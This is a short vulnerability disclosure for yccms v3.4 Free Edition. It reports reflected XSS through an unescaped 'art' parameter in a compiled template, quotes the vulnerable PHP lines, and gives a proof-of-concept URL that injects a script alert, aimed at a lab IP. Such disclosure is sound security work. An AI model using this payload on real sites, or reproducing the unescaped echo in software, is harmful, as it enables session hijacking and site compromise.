# General
Vulnerability Name: yccms v3.4-Free Edition allows reflected XSS via the `/compile/%%D8^D83^D83C04B9%%createhtml.tpl.php` art parameter  

Exploit Author: goldsnakeman  

Vendor Homepage: http://www.yccms.net  

Software Link: http://www.yccms.net/YCCMS_free.rar   

Version: v3.4 Free Edition  

# Vulnerability Overview
Affected code is located at `/compile/%%D8^D83^D83C04B9%%createhtml.tpl.php`，Lines 22 and 23：  

`<?php if ($_GET['art']): ?>`  
`<dd><span class="state">内容生成完毕 !共 <?php echo $_GET['art']; ?>`  

The code in question accepts the `art` parameter without escaping the special characters

# POC
After the administrator logged in, write the POC as:  

`http://172.16.141.134/yccms-v3.4-free/admin/?a=html&m=arts&art=%3Cscript%3Ealert(/xss/);%3C/script%3E`  

![](https://github.com/hellogoldsnakeman/vulnerable/blob/master/yccms/2.jpg)  

![](https://github.com/hellogoldsnakeman/vulnerable/blob/master/yccms/3.jpg)  
